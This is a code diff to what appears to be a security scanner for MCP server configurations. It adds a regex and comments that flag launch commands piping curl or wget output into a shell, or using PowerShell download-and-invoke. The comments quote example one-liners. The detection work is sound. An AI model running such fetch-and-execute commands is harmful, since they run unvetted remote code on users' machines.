@@ -167,6 +167,20 @@ _SHELLOUT_MARKERS = (
     "kernel.system", "io.popen", "commandline",
 )
 
+# A launch command that FETCHES remote code and pipes it straight into a shell:
+# `sh -c "curl https://x | sh"`, `wget -qO- x | bash`, or PowerShell
+# `iex(iwr x)` / `iex((New-Object Net.WebClient).DownloadString(...))`. Unlike
+# ATL-105 (a package auto-installer, npx -y / uvx) or ATL-155 (a fetch-exec
+# one-liner inside an *instruction* file), this is the SERVER LAUNCH itself
+# running attacker-changeable remote code the moment the config loads - the
+# config-injection RCE class (TrustFall / poisoned .mcp.json). Deliberately
+# narrow: a fetch tool piped into a shell, or a PowerShell download-and-invoke.
+_FETCH_EXEC_RE = re.compile(
+    r"(?:curl|wget)\b[^|&;]*[|]\s*(?:sudo\s+)?(?:sh|bash|zsh|dash|-)"
+    r"|iex\s*\(\s*(?:iwr|invoke-webrequest|new-object\s+net\.webclient)",
+    re.IGNORECASE,
+)
+
 
 def _interpreter_shellout(command: str, args: list) -> bool:
     """True if the launch is an interpreter running inline code that spawns a
@@ -715,6 +729,11 @@ def component_from_server(name: str, cfg, source: str) -> Component:
         attrs["_auto_approve"] = bool(auto_list) or any(
             flag in launch for flag in _AUTO_APPROVE_FLAGS
         )
+        # Config-injection RCE (ATL-171): the launch command fetches remote code
+        # and pipes it into a shell, so loading this config runs attacker-changeable
+        # code before the model reasons - distinct from a package auto-installer
+        # (ATL-105) and from a fetch-exec line in an instruction file (ATL-155).
+        attrs["_launch_fetch_exec"] = bool(_FETCH_EXEC_RE.search(launch))
         # Remote transport (a `url`) that is genuinely exposed: a non-loopback,
         # PLAINTEXT http endpoint with no declared authentication. A secret env
         # var or an auth header counts as "authenticated"; only set on remote
